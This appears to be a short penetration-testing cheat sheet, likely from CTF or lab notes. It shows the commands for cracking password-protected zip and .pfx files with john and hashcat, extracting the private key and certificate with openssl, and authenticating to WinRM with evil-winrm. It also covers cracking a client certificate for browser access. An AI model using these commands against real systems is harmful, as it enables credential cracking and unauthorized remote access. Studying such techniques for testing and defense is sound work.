# PFX Certificate Cracking + WinRM Cert Auth

`.pfx` / `.p12` files contain a certificate + private key. If password-protected, crack offline. Then use the cert to authenticate to WinRM (port 5986/SSL) without a password.

**Crack zip containing .pfx first (if needed):**
```bash
zip2john encrypted.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
unzip -P <PASSWORD> encrypted.zip
```

**Crack the .pfx password:**
```bash
pfx2john.py legacyy_dev_auth.pfx > pfx.hash
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
# or hashcat -m 9000 pfx.hash <wordlist>
```

**Extract cert + key from .pfx:**
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key -nodes -passin pass:<CRACK_PASS>
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.crt -passin pass:<CRACK_PASS>
```

**Authenticate with Evil-WinRM using cert (no password):**
```bash
evil-winrm -i <TARGET> -S -k priv.key -c cert.crt
# -S = SSL (port 5986)
```

**Crack a client certificate .pfx for HTTPS browser auth:**
```bash
pfx2john.py staff.pfx > staff.hash
john staff.hash --wordlist=/usr/share/wordlists/rockyou.txt
# Import the cracked .pfx into Firefox to access client-cert protected sites
```
